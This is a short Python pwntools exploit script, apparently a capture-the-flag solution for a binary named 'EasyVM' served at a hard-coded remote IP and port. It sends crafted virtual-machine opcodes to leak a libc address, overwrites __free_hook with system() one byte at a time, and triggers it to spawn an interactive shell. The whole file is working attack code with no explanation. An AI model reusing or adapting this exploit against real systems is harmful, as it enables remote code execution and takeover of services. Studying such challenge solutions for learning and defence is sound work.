from pwn import *
context.log_level = 'debug'
#p = process("./EasyVM")
p = remote("121.36.215.224", 9999)
libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
def debug(addr,PIE=True): 
	if PIE: 
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16) 
		gdb.attach(p,'b *{}'.format(hex(text_base+addr))) 
	else: gdb.attach(p,"b *{}".format(hex(addr)))
def dbg(b= ''):
    gdb.attach(p, b)
    if b == '':
    	p.interactive()
def op(buf):
	p.sendlineafter(">>> \n", '1')
	sleep(0.1)
	p.send(buf+'\x99')
	p.sendlineafter(">>> \n", '2')
buf = ('\x71'+'\x00'*4)*78
op(buf)
p.sendlineafter(">>> \n", '3')
buf = '\x11'
op(buf)
p.recvuntil("0x")
libc.address = int(p.recv(8), 16)-0xf7eff930+0xf7d4d000
log.info("libc.address ==> " + hex(libc.address))
buf = '\x71'+'sh\x00\x00'
op(buf)

for i in range(4):
	buf = '\x71'+p32(libc.sym['__free_hook']+i)+'\x76'+'\x00'*4
	op(buf)
	buf = '\x54\x00'
	op(buf)
	sleep(0.1)
	p.send(chr(((libc.sym['system'])>>(i*8))&0xff))

p.sendlineafter(">>> \n", '3')
#dbg()
p.interactive()